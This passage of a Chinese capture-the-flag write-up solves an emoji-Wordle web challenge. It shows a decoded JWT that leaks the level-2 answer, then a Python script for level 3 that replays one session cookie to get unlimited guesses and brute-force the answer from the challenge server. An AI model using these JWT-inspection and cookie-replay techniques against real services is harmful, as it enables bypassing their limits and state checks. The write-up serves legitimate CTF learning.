<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h5><ile-root id="ile-23"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-23--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMiIsInJlbWFpbmluZ19ndWVzc2VzIjoiOCIsInRhcmdldCI6Ilx1RDgzRFx1REM3Q1x1RDgzRFx1REM3QVx1RDgzRFx1REM3OFx1RDgzRFx1REM2MFx1RDgzRFx1REM3Q1x1RDgzRFx1REM2N1x1RDgzRFx1REM1Mlx1RDgzRFx1REM1OFx1RDgzRFx1REM1NVx1RDgzRFx1REM1Rlx1RDgzRFx1REM2MFx1RDgzRFx1REM1RFx1RDgzRFx1REM4Mlx1RDgzRFx1REM0OFx1RDgzRFx1REM4Nlx1RDgzRFx1REM3OVx1RDgzRFx1REM0OFx1RDgzRFx1REM3Qlx1RDgzRFx1REM2Nlx1RDgzRFx1REM2NFx1RDgzRFx1REMzRlx1RDgzRFx1REM4OVx1RDgzRFx1REM1Q1x1RDgzRFx1REM2MVx1RDgzRFx1REM1Nlx1RDgzRFx1REM0Nlx1RDgzRFx1REM0MVx1RDgzRFx1REM2QVx1RDgzRFx1REM4OVx1RDgzRFx1REM1NVx1RDgzRFx1REM3Q1x1RDgzRFx1REM2Nlx1RDgzRFx1REM3Rlx1RDgzRFx1REM0M1x1RDgzRFx1REM0MVx1RDgzRFx1REM4N1x1RDgzRFx1REMzQlx1RDgzRFx1REM2Mlx1RDgzRFx1REM2Nlx1RDgzRFx1REM0Mlx1RDgzRFx1REM1NVx1RDgzRFx1REM1OFx1RDgzRFx1REM3QVx1RDgzRFx1REM4Mlx1RDgzRFx1REM0MVx1RDgzRFx1REM3NFx1RDgzRFx1REM1RVx1RDgzRFx1REM4NVx1RDgzRFx1REM3RVx1RDgzRFx1REM4MFx1RDgzRFx1REM0Nlx1RDgzRFx1REM3Rlx1RDgzRFx1REM1QVx1RDgzRFx1REM1Nlx1RDgzRFx1REM3Nlx1RDgzRFx1REM1Rlx1RDgzRFx1REM4NVx1RDgzRFx1REM1QVx1RDgzRFx1REM4Nlx1RDgzRFx1REM1Q1x1RDgzRFx1REM0NFx1RDgzRFx1REM4M1x1RDgzRFx1REM3OFx1RDgzRFx1REM3NSJ9LCJuYmYiOjE2OTcyNzMwODMsImlhdCI6MTY5NzI3MzA4M30.CUW8AK66IkZkgs2qmFtZaK-YcaaGvPK8QYr8cssmLV4</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMiIsInJlbWFpbmluZ19ndWVzc2VzIjoiOCIsInRhcmdldCI6Ilx1RDgzRFx1REM3Q1x1RDgzRFx1REM3QVx1RDgzRFx1REM3OFx1RDgzRFx1REM2MFx1RDgzRFx1REM3Q1x1RDgzRFx1REM2N1x1RDgzRFx1REM1Mlx1RDgzRFx1REM1OFx1RDgzRFx1REM1NVx1RDgzRFx1REM1Rlx1RDgzRFx1REM2MFx1RDgzRFx1REM1RFx1RDgzRFx1REM4Mlx1RDgzRFx1REM0OFx1RDgzRFx1REM4Nlx1RDgzRFx1REM3OVx1RDgzRFx1REM0OFx1RDgzRFx1REM3Qlx1RDgzRFx1REM2Nlx1RDgzRFx1REM2NFx1RDgzRFx1REMzRlx1RDgzRFx1REM4OVx1RDgzRFx1REM1Q1x1RDgzRFx1REM2MVx1RDgzRFx1REM1Nlx1RDgzRFx1REM0Nlx1RDgzRFx1REM0MVx1RDgzRFx1REM2QVx1RDgzRFx1REM4OVx1RDgzRFx1REM1NVx1RDgzRFx1REM3Q1x1RDgzRFx1REM2Nlx1RDgzRFx1REM3Rlx1RDgzRFx1REM0M1x1RDgzRFx1REM0MVx1RDgzRFx1REM4N1x1RDgzRFx1REMzQlx1RDgzRFx1REM2Mlx1RDgzRFx1REM2Nlx1RDgzRFx1REM0Mlx1RDgzRFx1REM1NVx1RDgzRFx1REM1OFx1RDgzRFx1REM3QVx1RDgzRFx1REM4Mlx1RDgzRFx1REM0MVx1RDgzRFx1REM3NFx1RDgzRFx1REM1RVx1RDgzRFx1REM4NVx1RDgzRFx1REM3RVx1RDgzRFx1REM4MFx1RDgzRFx1REM0Nlx1RDgzRFx1REM3Rlx1RDgzRFx1REM1QVx1RDgzRFx1REM1Nlx1RDgzRFx1REM3Nlx1RDgzRFx1REM1Rlx1RDgzRFx1REM4NVx1RDgzRFx1REM1QVx1RDgzRFx1REM4Nlx1RDgzRFx1REM1Q1x1RDgzRFx1REM0NFx1RDgzRFx1REM4M1x1RDgzRFx1REM3OFx1RDgzRFx1REM3NSJ9LCJuYmYiOjE2OTcyNzMwODMsImlhdCI6MTY5NzI3MzA4M30.CUW8AK66IkZkgs2qmFtZaK-YcaaGvPK8QYr8cssmLV4</span></span></samp></pre></div></section>
<section class="code-block relative my-6 shadow" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" aria-label="plain text 代码块" data-v-ad49d235>plain text</h5><ile-root id="ile-24"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-24--></div><div class="light:hidden" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><samp><span><span style="color: #d6deeb">{&quot;data&quot;:{&quot;level&quot;:&quot;2&quot;,&quot;remaining_guesses&quot;:&quot;8&quot;,&quot;target&quot;:&quot;\uD83D\uDC7C\uD83D\uDC7A\uD83D\uDC78\uD83D\uDC60\uD83D\uDC7C\uD83D\uDC67\uD83D\uDC52\uD83D\uDC58\uD83D\uDC55\uD83D\uDC5F\uD83D\uDC60\uD83D\uDC5D\uD83D\uDC82\uD83D\uDC48\uD83D\uDC86\uD83D\uDC79\uD83D\uDC48\uD83D\uDC7B\uD83D\uDC66\uD83D\uDC64\uD83D\uDC3F\uD83D\uDC89\uD83D\uDC5C\uD83D\uDC61\uD83D\uDC56\uD83D\uDC46\uD83D\uDC41\uD83D\uDC6A\uD83D\uDC89\uD83D\uDC55\uD83D\uDC7C\uD83D\uDC66\uD83D\uDC7F\uD83D\uDC43\uD83D\uDC41\uD83D\uDC87\uD83D\uDC3B\uD83D\uDC62\uD83D\uDC66\uD83D\uDC42\uD83D\uDC55\uD83D\uDC58\uD83D\uDC7A\uD83D\uDC82\uD83D\uDC41\uD83D\uDC74\uD83D\uDC5E\uD83D\uDC85\uD83D\uDC7E\uD83D\uDC80\uD83D\uDC46\uD83D\uDC7F\uD83D\uDC5A\uD83D\uDC56\uD83D\uDC76\uD83D\uDC5F\uD83D\uDC85\uD83D\uDC5A\uD83D\uDC86\uD83D\uDC5C\uD83D\uDC44\uD83D\uDC83\uD83D\uDC78\uD83D\uDC75&quot;},&quot;nbf&quot;:1697273083,&quot;iat&quot;:1697273083}</span></span></samp></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><samp><span><span style="color: #403f53">{&quot;data&quot;:{&quot;level&quot;:&quot;2&quot;,&quot;remaining_guesses&quot;:&quot;8&quot;,&quot;target&quot;:&quot;\uD83D\uDC7C\uD83D\uDC7A\uD83D\uDC78\uD83D\uDC60\uD83D\uDC7C\uD83D\uDC67\uD83D\uDC52\uD83D\uDC58\uD83D\uDC55\uD83D\uDC5F\uD83D\uDC60\uD83D\uDC5D\uD83D\uDC82\uD83D\uDC48\uD83D\uDC86\uD83D\uDC79\uD83D\uDC48\uD83D\uDC7B\uD83D\uDC66\uD83D\uDC64\uD83D\uDC3F\uD83D\uDC89\uD83D\uDC5C\uD83D\uDC61\uD83D\uDC56\uD83D\uDC46\uD83D\uDC41\uD83D\uDC6A\uD83D\uDC89\uD83D\uDC55\uD83D\uDC7C\uD83D\uDC66\uD83D\uDC7F\uD83D\uDC43\uD83D\uDC41\uD83D\uDC87\uD83D\uDC3B\uD83D\uDC62\uD83D\uDC66\uD83D\uDC42\uD83D\uDC55\uD83D\uDC58\uD83D\uDC7A\uD83D\uDC82\uD83D\uDC41\uD83D\uDC74\uD83D\uDC5E\uD83D\uDC85\uD83D\uDC7E\uD83D\uDC80\uD83D\uDC46\uD83D\uDC7F\uD83D\uDC5A\uD83D\uDC56\uD83D\uDC76\uD83D\uDC5F\uD83D\uDC85\uD83D\uDC5A\uD83D\uDC86\uD83D\uDC5C\uD83D\uDC44\uD83D\uDC83\uD83D\uDC78\uD83D\uDC75&quot;},&quot;nbf&quot;:1697273083,&quot;iat&quot;:1697273083}</span></span></samp></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/emodle-flag2.c5e364ad.webp"><img srcset="/assets/emodle-flag2.6272b31a.png" loading="lazy" src="/assets/emodle-flag2.6272b31a.png" width="1295" height="292" alt="flag2"></picture></p>
<h4 id="level-3-4" class="heading"><a href="#level-3-4" class="heading-anchor" aria-label="章节： Level 3" tabindex="-1"></a><span>Level 3</span></h4>
<p>level 3 的 JWT 不再包含答案<span class="mojikumi-line-end">，</span>但包含 seed 和剩余猜测次数<span class="mojikumi-line-end">。</span>这说明游戏状态存于 client side<span class="mojikumi-line-end">，</span>一直用同一个 Cookie 而不接受服务器发来的新 Cookie 即可无限次猜测<span class="mojikumi-line-end">，</span>然后就和 level 1 一样了<span class="mojikumi-line-start">（</span>下面的代码主要就是改了个设置 Cookie<span class="mojikumi">）</span><span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-25"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-25--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> re</span></span>
<span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> requests</span></span>
<span></span>
<span><span style="color: #D6DEEB">port </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">50326</span></span>
<span><span style="color: #D6DEEB">url </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">f</span><span style="color: #ECC48D">&quot;http://chal.thuctf.redbud.info:</span><span style="color: #82AAFF">{</span><span style="color: #D6DEEB">port</span><span style="color: #82AAFF">}</span><span style="color: #ECC48D">/level3&quot;</span></span>
<span></span>
<span><span style="color: #D6DEEB">emojis </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[]</span></span>
<span></span>
<span><span style="color: #C792EA">with</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">open</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">emoji-sequences.txt</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">as</span><span style="color: #D6DEEB"> seq:</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> line </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> seq:</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">line</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">&lt;</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">or</span><span style="color: #D6DEEB"> line.</span><span style="color: #B2CCD6">startswith</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">#</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">continue</span></span>
<span><span style="color: #D6DEEB">        code </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> line.</span><span style="color: #B2CCD6">split</span><span style="color: #D6DEEB">()</span><span style="color: #D9F5DD">[</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">]</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">..</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> code:</span></span>
<span><span style="color: #D6DEEB">            l, r </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> code.</span><span style="color: #B2CCD6">split</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">..</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">else</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            l, r </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> code, code</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">int</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">l</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">16</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C5E478">int</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">r</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">16</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">            emojis.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">chr</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">i</span><span style="color: #D6DEEB">))</span></span>
<span></span>
<span></span>
<span><span style="color: #D6DEEB">emojis </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;&quot;</span><span style="color: #D6DEEB">.</span><span style="color: #B2CCD6">join</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">set</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">emojis</span><span style="color: #D6DEEB">))</span></span>
<span></span>
<span><span style="color: #D6DEEB">cookies </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #FF5874">None</span></span>
<span></span>
<span><span style="color: #C792EA">def</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">guess</span><span style="color: #D9F5DD">(</span><span style="color: #7FDBCA">g</span><span style="color: #D6DEEB">: </span><span style="color: #C5E478">str</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">global</span><span style="color: #D6DEEB"> cookies</span></span>
<span><span style="color: #D6DEEB">    res </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> requests.</span><span style="color: #B2CCD6">get</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">url</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D7DBE0">params</span><span style="color: #C792EA">=</span><span style="color: #82AAFF">{</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">guess</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">: g}</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D7DBE0">cookies</span><span style="color: #C792EA">=</span><span style="color: #82AAFF">cookies</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> cookies </span><span style="color: #C792EA">is</span><span style="color: #D6DEEB"> </span><span style="color: #FF5874">None</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">        cookies </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> res.cookies</span></span>
<span><span style="color: #D6DEEB">    m </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> re.</span><span style="color: #B2CCD6">findall</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">results</span><span style="color: #F78C6C">\\</span><span style="color: #ECC48D">.push</span><span style="color: #F78C6C">\\</span><span style="color: #ECC48D">(&quot;([🟥🟨🟩]*)&quot;</span><span style="color: #F78C6C">\\</span><span style="color: #ECC48D">)</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> res.text</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">[</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">]</span></span>
<span><span style="color: #D6DEEB">    result </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[]</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> c </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> m:</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> c </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">🟥</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            result.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">r</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">elif</span><span style="color: #D6DEEB"> c </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">🟨</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            result.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">y</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">else</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            result.</span><span style="color: #B2CCD6">append</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">g</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> result.</span><span style="color: #B2CCD6">count</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">g</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">64</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">res.text</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB"> result</span></span>
<span></span>
<span></span>
<span><span style="color: #D6DEEB">answer </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">?</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">64</span></span>
<span><span style="color: #D6DEEB">charset </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">set</span><span style="color: #D6DEEB">()</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">emojis</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">64</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    res </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">guess</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">emojis</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i : i </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">64</span><span style="color: #D6DEEB">])</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">64</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">+</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">&gt;=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">emojis</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">break</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> res[j] </span><span style="color: #C792EA">!=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">r</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            charset.</span><span style="color: #B2CCD6">add</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">emojis</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> j</span><span style="color: #D6DEEB">])</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> e </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> charset:</span></span>
<span><span style="color: #D6DEEB">    res </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">guess</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">e </span><span style="color: #C792EA">*</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">64</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> j </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">64</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> res[j] </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">g</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">            answer[j] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> e</span></span>
<span></span>
<span><span style="color: #B2CCD6">guess</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;&quot;</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">join</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">answer</span><span style="color: #D6DEEB">))</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">import</span><span style="color: #403F53"> re</span></span>
<span><span style="color: #994CC3">import</span><span style="color: #403F53"> requests</span></span>
<span></span>
<span><span style="color: #403F53">port </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">50326</span></span>
<span><span style="color: #403F53">url </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">f</span><span style="color: #C96765">&quot;http://chal.thuctf.redbud.info:</span><span style="color: #4876D6">{</span><span style="color: #403F53">port</span><span style="color: #4876D6">}</span><span style="color: #C96765">/level3&quot;</span></span>
<span></span>
<span><span style="color: #403F53">emojis </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">[]</span></span>
<span></span>
<span><span style="color: #994CC3">with</span><span style="color: #403F53"> </span><span style="color: #4876D6">open</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">emoji-sequences.txt</span><span style="color: #111111">&quot;</span><span style="color: #403F53">) </span><span style="color: #994CC3">as</span><span style="color: #403F53"> seq:</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">for</span><span style="color: #403F53"> line </span><span style="color: #994CC3">in</span><span style="color: #403F53"> seq:</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> </span><span style="color: #4876D6">len</span><span style="color: #403F53">(</span><span style="color: #4876D6">line</span><span style="color: #403F53">) </span><span style="color: #994CC3">&lt;</span><span style="color: #403F53"> </span><span style="color: #AA0982">2</span><span style="color: #403F53"> </span><span style="color: #994CC3">or</span><span style="color: #403F53"> line.</span><span style="color: #0C969B">startswith</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">#</span><span style="color: #111111">&quot;</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">continue</span></span>
<span><span style="color: #403F53">        code </span><span style="color: #994CC3">=</span><span style="color: #403F53"> line.</span><span style="color: #0C969B">split</span><span style="color: #403F53">()</span><span style="color: #111111">[</span><span style="color: #AA0982">0</span><span style="color: #111111">]</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">..</span><span style="color: #111111">&quot;</span><span style="color: #403F53"> </span><span style="color: #994CC3">in</span><span style="color: #403F53"> code:</span></span>
<span><span style="color: #403F53">            l, r </span><span style="color: #994CC3">=</span><span style="color: #403F53"> code.</span><span style="color: #0C969B">split</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">..</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">else</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">            l, r </span><span style="color: #994CC3">=</span><span style="color: #403F53"> code, code</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #4876D6">int</span><span style="color: #403F53">(</span><span style="color: #4876D6">l</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">16</span><span style="color: #403F53">)</span><span style="color: #111111">,</span><span style="color: #4876D6"> int</span><span style="color: #403F53">(</span><span style="color: #4876D6">r</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">16</span><span style="color: #403F53">)</span><span style="color: #4876D6"> </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">            emojis.</span><span style="color: #0C969B">append</span><span style="color: #403F53">(</span><span style="color: #4876D6">chr</span><span style="color: #403F53">(</span><span style="color: #4876D6">i</span><span style="color: #403F53">))</span></span>
<span></span>
<span></span>
